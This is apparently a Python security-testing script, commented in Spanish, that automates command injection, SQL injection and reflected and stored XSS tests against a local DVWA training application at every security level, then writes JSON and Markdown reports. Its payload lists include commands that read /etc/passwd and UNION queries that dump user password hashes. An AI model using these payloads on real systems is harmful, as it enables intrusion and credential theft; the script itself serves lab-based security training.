import requests
import time
import urllib.parse
from bs4 import BeautifulSoup
import json
import re

class DVWATester:
    def __init__(self, base_url="http://localhost"):
        self.base_url = base_url
        self.session = requests.Session()
        self.security_levels = ['low', 'medium', 'high', 'impossible']
        self.results = {
            'command_injection': {},
            'sql_injection': {},
            'xss_reflected': {},
            'xss_stored': {}
        }
        
    def login(self, username="admin", password="password"):
        """Iniciar sesión en DVWA"""
        login_url = f"{self.base_url}/login.php"
        
        try:
            # Obtener página de login
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Buscar token CSRF
            csrf_input = soup.find('input', {'name': 'user_token'})
            csrf_token = csrf_input.get('value', '') if csrf_input else ''
            
            # Datos de login
            login_data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            
            if csrf_token:
                login_data['user_token'] = csrf_token
            
            # Realizar login
            response = self.session.post(login_url, data=login_data)
            
            # Verificar login exitoso
            success_indicators = [
                "Welcome to Damn Vulnerable Web Application",
                "Damn Vulnerable Web Application",
                "DVWA Security"
            ]
            
            login_successful = any(indicator in response.text for indicator in success_indicators)
            
            if login_successful:
                print("✅ Login exitoso en DVWA")
                return True
            else:
                print("❌ Error en login - Verificar credenciales o URL")
                print(f"URL probada: {login_url}")
                return False
                
        except Exception as e:
            print(f"❌ Error durante login: {e}")
            return False

    def set_security_level(self, level):
        """Cambiar nivel de seguridad en DVWA"""
        security_url = f"{self.base_url}/security.php"
        
        try:
            # Obtener página de seguridad
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Buscar token CSRF
            csrf_input = soup.find('input', {'name': 'user_token'})
            csrf_token = csrf_input.get('value', '') if csrf_input else ''
            
            # Cambiar nivel de seguridad
            security_data = {
                'security': level,
                'seclev_submit': 'Submit'
            }
            
            if csrf_token:
                security_data['user_token'] = csrf_token
            
            response = self.session.post(security_url, data=security_data)
            print(f"🔒 Nivel de seguridad cambiado a: {level.upper()}")
            time.sleep(1)
            
        except Exception as e:
            print(f"❌ Error cambiando nivel de seguridad: {e}")

    def analyze_command_injection(self, response_text, payload):
        """Analizar respuesta para detectar command injection - MEJORADO"""
        
        # Normalizar texto para análisis
        response_lower = response_text.lower()
        
        # Indicadores específicos de ejecución de comandos
        command_indicators = {
            'whoami': ['www-data', 'apache', 'nginx', 'root'],
            'id': ['uid=', 'gid=', 'groups='],
            'ls': ['drwx', '-rw-', 'total ', './', '../'],
            'cat /etc/passwd': ['root:x:0:0:', 'daemon:x:1:1:', 'bin:x:2:2:'],
            'uname': ['linux', 'ubuntu', 'debian', 'kernel'],
            'ps': ['pid', 'ppid', 'cmd', 'command']
        }
        
        # Verificar si el payload contiene comandos conocidos
        for command, indicators in command_indicators.items():
            if any(cmd in payload.lower() for cmd in command.split()):
                # Si encontramos indicadores específicos del comando
                if any(indicator in response_lower for indicator in indicators):
                    return True
        
        # Verificar patrones de salida de comandos Unix/Linux
        unix_patterns = [
            r'uid=\d+',  # output de 'id'
            r'gid=\d+',  # output de 'id' 
            r'total \d+',  # output de 'ls -la'
            r'drwx[\w-]{6}',  # permisos de directorio
            r'-rw[\w-]{6}',   # permisos de archivo
            r'root:x:\d+:\d+',  # línea de /etc/passwd
        ]
        
        for pattern in unix_patterns:
            if re.search(pattern, response_text):
                return True
        
        # Verificar si hay cambio significativo en el tamaño de respuesta
        # (podría indicar output adicional de comando)
        baseline_length = 800  # Longitud aproximada de respuesta normal
        if len(response_text) > baseline_length * 1.5:
            # Verificar que no sea solo HTML repetido
            if '<br>' not in response_text or response_text.count('<br>') < 10:
                return True
        
        return False

    def analyze_sql_injection(self, response_text, payload):
        """Analizar respuesta para detectar SQL injection - MEJORADO"""
        
        # Contar entradas de usuarios
        user_entries = response_text.count('First name:')
        surname_entries = response_text.count('Surname:')
        
        # Si hay múltiples usuarios, es probable que sea bypass exitoso
        if user_entries > 1 or surname_entries > 1:
            return True
        
        # Buscar información específica de base de datos
        db_specific_indicators = [
            '@version',  # MySQL version
            'user()',    # MySQL user function
            'version()', # Version function
            'database()', # Database function
            'mysql',     # MySQL específico
            'root@localhost',  # Usuario típico de MySQL
        ]
        
        # Buscar hashes de contraseñas (típicamente largos strings hexadecimales)
        hash_pattern = r'[a-f0-9]{32,64}'  # MD5, SHA1, SHA256 hashes
        if re.search(hash_pattern, response_text):
            return True
        
        # Buscar errores SQL que revelan información
        sql_errors = [
            'mysql_fetch',
            'sql syntax',
            'mysql error',
            'warning: mysql',
            'you have an error in your sql syntax'
        ]
        
        response_lower = response_text.lower()
        for error in sql_errors:
            if error in response_lower:
                return True
        
        # Verificar indicadores específicos del payload
        if 'union' in payload.lower():
            # Para UNION attacks, buscar datos típicos
            if any(indicator in response_lower for indicator in db_specific_indicators):
                return True
        
        return False

    def test_command_injection(self, level):
        """Probar inyección de comandos"""
        print(f"\n🔍 Probando Command Injection - Nivel {level.upper()}")
        
        ci_url = f"{self.base_url}/vulnerabilities/exec/"
        
        # Payloads específicos para diferentes sistemas
        payloads = [
            "127.0.0.1; whoami",
            "127.0.0.1 && whoami", 
            "127.0.0.1 | whoami",
            "127.0.0.1; id",
            "127.0.0.1; ls -la",
            "127.0.0.1; cat /etc/passwd",
            "127.0.0.1; uname -a",
            "127.0.0.1 && id"
        ]
        
        results = []
        
        for payload in payloads:
            try:
                # Obtener página y token CSRF
                response = self.session.get(ci_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                csrf_input = soup.find('input', {'name': 'user_token'})
                csrf_token = csrf_input.get('value', '') if csrf_input else ''
                
                # Preparar datos
                data = {
                    'ip': payload,
                    'Submit': 'Submit'
                }
                
                if csrf_token:
                    data['user_token'] = csrf_token
                
                # Enviar payload
                response = self.session.post(ci_url, data=data)
                
                # Analizar respuesta
                vulnerable = self.analyze_command_injection(response.text, payload)
                
                # Debug: Mostrar fragmento de respuesta para análisis
                if level == 'low' and payload == "127.0.0.1; whoami":
                    print(f"  📝 Debug - Tamaño respuesta: {len(response.text)} chars")
                
                results.append({
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'response_length': len(response.text),
                    'level': level
                })
                
                if vulnerable:
                    print(f"  ⚠️  VULNERABLE: {payload}")
                else:
                    print(f"  ✅ SEGURO: {payload}")
                    
            except Exception as e:
                print(f"  ❌ Error con payload {payload}: {e}")
                results.append({
                    'payload': payload,
                    'vulnerable': False,
                    'error': str(e),
                    'level': level
                })
        
        self.results['command_injection'][level] = results

    def test_sql_injection(self, level):
        """Probar inyección SQL"""
        print(f"\n🔍 Probando SQL Injection - Nivel {level.upper()}")
        
        sqli_url = f"{self.base_url}/vulnerabilities/sqli/"
        
        payloads = [
            "1' OR '1'='1",
            "1' OR 1=1 --",
            "1' OR 1=1 #",
            "1' UNION SELECT user(), version() --",
            "1' UNION SELECT 1,2 --",
            "1' UNION SELECT user, password FROM users --",
            "1' UNION SELECT null, concat(user,':',password) FROM users --"
        ]
        
        results = []
        
        for payload in payloads:
            try:
                # Obtener página y token CSRF
                response = self.session.get(sqli_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                csrf_input = soup.find('input', {'name': 'user_token'})
                csrf_token = csrf_input.get('value', '') if csrf_input else ''
                
                # Preparar datos
                data = {
                    'id': payload,
                    'Submit': 'Submit'
                }
                
                if csrf_token:
                    data['user_token'] = csrf_token
                
                # Enviar payload
                response = self.session.post(sqli_url, data=data)
                
                # Analizar respuesta
                vulnerable = self.analyze_sql_injection(response.text, payload)
                
                results.append({
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'response_length': len(response.text),
                    'level': level
                })
                
                if vulnerable:
                    print(f"  ⚠️  VULNERABLE: {payload}")
                else:
                    print(f"  ✅ SEGURO: {payload}")
                    
            except Exception as e:
                print(f"  ❌ Error con payload {payload}: {e}")
                results.append({
                    'payload': payload,
                    'vulnerable': False,
                    'error': str(e),
                    'level': level
                })
        
        self.results['sql_injection'][level] = results

    def test_xss_reflected(self, level):
        """Probar XSS reflejado"""
        print(f"\n🔍 Probando XSS Reflected - Nivel {level.upper()}")
        
        xss_url = f"{self.base_url}/vulnerabilities/xss_r/"
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<svg onload='alert(\"XSS\")'>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload='alert(\"XSS\")'>",
            "javascript:alert('XSS')",
            "<input type='text' onfocus='alert(\"XSS\")' autofocus>"
        ]
        
        results = []
        
        for payload in payloads:
            try:
                # Enviar payload en parámetro GET
                params = {'name': payload}
                response = self.session.get(xss_url, params=params)
                
                # Analizar respuesta - verificar si el payload aparece sin codificar
                vulnerable = payload in response.text
                
                # También verificar si partes del payload están presentes
                if not vulnerable:
                    # Verificar elementos peligrosos específicos
                    dangerous_elements = ['<script', 'javascript:', 'onerror=', 'onload=']
                    for element in dangerous_elements:
                        if element in payload.lower() and element in response.text.lower():
                            vulnerable = True
                            break
                
                results.append({
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'response_length': len(response.text),
                    'level': level
                })
                
                if vulnerable:
                    print(f"  ⚠️  VULNERABLE: {payload}")
                else:
                    print(f"  ✅ SEGURO: {payload}")
                    
            except Exception as e:
                print(f"  ❌ Error con payload {payload}: {e}")
                results.append({
                    'payload': payload,
                    'vulnerable': False,
                    'error': str(e),
                    'level': level
                })
        
        self.results['xss_reflected'][level] = results

    def test_xss_stored(self, level):
        """Probar XSS almacenado"""
        print(f"\n🔍 Probando XSS Stored - Nivel {level.upper()}")
        
        xss_stored_url = f"{self.base_url}/vulnerabilities/xss_s/"
        
        payloads = [
            "<script>alert('XSS Stored')</script>",
            "<img src='x' onerror='alert(\"Stored XSS\")'>",
            "<svg onload='alert(\"Stored\")'>",
            "<iframe src='javascript:alert(\"Stored\")'></iframe>"
        ]
        
        results = []
        
        for payload in payloads:
            try:
                # Obtener página y token CSRF
                response = self.session.get(xss_stored_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                csrf_input = soup.find('input', {'name': 'user_token'})
                csrf_token = csrf_input.get('value', '') if csrf_input else ''
                
                # Enviar payload al formulario de comentarios
                data = {
                    'txtName': 'TestUser',
                    'mtxMessage': payload,
                    'btnSign': 'Sign Guestbook'
                }
                
                if csrf_token:
                    data['user_token'] = csrf_token
                
                # Enviar payload
                response = self.session.post(xss_stored_url, data=data)
                
                # Verificar si el payload se almacenó y se refleja
                vulnerable = payload in response.text
                
                results.append({
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'response_length': len(response.text),
                    'level': level
                })
                
                if vulnerable:
                    print(f"  ⚠️  VULNERABLE: {payload}")
                else:
                    print(f"  ✅ SEGURO: {payload}")
                    
            except Exception as e:
                print(f"  ❌ Error con payload {payload}: {e}")
                results.append({
                    'payload': payload,
                    'vulnerable': False,
                    'error': str(e),
                    'level': level
                })
        
        self.results['xss_stored'][level] = results

    def generate_detailed_report(self):
        """Generar reporte detallado con análisis"""
        
        # Reporte JSON
        with open('dvwa_test_results.json', 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        # Reporte Markdown detallado
        report = f"""# Reporte Detallado de Pruebas de Seguridad DVWA

**Fecha:** {time.strftime('%d de %B, %Y')}
**Hora:** {time.strftime('%H:%M:%S UTC')}
**Herramienta:** DVWA Security Tester v2.0

## 📊 Resumen Ejecutivo

"""
        
        # Análisis por vulnerabilidad
        for vuln_type, levels in self.results.items():
            vuln_name = vuln_type.replace('_', ' ').title()
            report += f"\n### {vuln_name}\n\n"
            
            for level, tests in levels.items():
                if not tests:  # Skip si no hay tests
                    continue
                    
                vulnerable_count = sum(1 for test in tests if test.get('vulnerable', False))
                total_tests = len(tests)
                percentage = (vulnerable_count / total_tests * 100) if total_tests > 0 else 0
                
                status = "🔴 CRÍTICO" if vulnerable_count == total_tests else \
                        "🟡 PARCIAL" if vulnerable_count > 0 else \
                        "🟢 SEGURO"
                
                report += f"**Nivel {level.upper()}:** {status}\n"
                report += f"- Pruebas realizadas: {total_tests}\n"
                report += f"- Vulnerabilidades: {vulnerable_count}/{total_tests} ({percentage:.1f}%)\n\n"
                
                if vulnerable_count > 0:
                    report += "**Payloads exitosos:**\n"
                    for test in tests:
                        if test.get('vulnerable', False):
                            report += f"- `{test['payload']}`\n"
                    report += "\n"
        
        # Agregar análisis de tendencias
        report += "\n## 📈 Análisis de Tendencias por Nivel\n\n"
        report += "| Vulnerabilidad | Low | Medium | High | Impossible |\n"
        report += "|----------------|-----|---------|------|------------|\n"
        
        for vuln_type, levels in self.results.items():
            vuln_name = vuln_type.replace('_', ' ').title()
            row = f"| {vuln_name} |"
            
            for level in ['low', 'medium', 'high', 'impossible']:
                if level in levels and levels[level]:
                    vulnerable_count = sum(1 for test in levels[level] if test.get('vulnerable', False))
                    total_tests = len(levels[level])
                    if vulnerable_count == total_tests:
                        status = " ❌ "
                    elif vulnerable_count > 0:
                        status = " ⚠️ "
                    else:
                        status = " ✅ "
                else:
                    status = " - "
                row += status + "|"
            
            report += row + "\n"
        
        # Recomendaciones
        report += """
## 🛡️ Recomendaciones de Seguridad

### Inmediatas (Críticas)
1. **Validar toda entrada del usuario** antes de procesarla
2. **Usar consultas preparadas** para todas las interacciones con BD
3. **Codificar todas las salidas** antes de mostrarlas al usuario
4. **Implementar listas blancas** en lugar de listas negras

### A Mediano Plazo
1. Implementar Content Security Policy (CSP)
2. Configurar cabeceras de seguridad HTTP
3. Realizar auditorías de código regulares
4. Capacitar al equipo de desarrollo en codificación segura

### Monitoreo Continuo
1. Implementar logging de seguridad
2. Configurar alertas de anomalías
3. Realizar pruebas de penetración periódicas
4. Mantener actualizadas las dependencias
"""
        
        with open('reporte_detallado_dvwa.md', 'w', encoding='utf-8') as f:
            f.write(report)
        
        print("\n📊 Reportes generados:")
        print("  - dvwa_test_results.json")
        print("  - reporte_detallado_dvwa.md")

    def run_full_test(self):
        """Ejecutar todas las pruebas en todos los niveles"""
        print("🚀 Iniciando pruebas de seguridad en DVWA")
        print("=" * 50)
        
        if not self.login():
            print("❌ No se pudo hacer login. Verificar:")
            print("  1. DVWA está ejecutándose en http://localhost")
            print("  2. Credenciales correctas (admin/password)")
            print("  3. Base de datos está configurada")
            return
        
        for level in self.security_levels:
            print(f"\n🔒 NIVEL DE SEGURIDAD: {level.upper()}")
            print("-" * 30)
            
            self.set_security_level(level)
            
            self.test_command_injection(level)
            self.test_sql_injection(level)
            self.test_xss_reflected(level)
            self.test_xss_stored(level)
            
            time.sleep(2)  # Pausa entre niveles
        
        print("\n✅ Todas las pruebas completadas")
        self.generate_detailed_report()

if __name__ == "__main__":
    print("🛡️  DVWA Security Tester")
    print("=" * 40)
    
    tester = DVWATester()
    tester.run_full_test()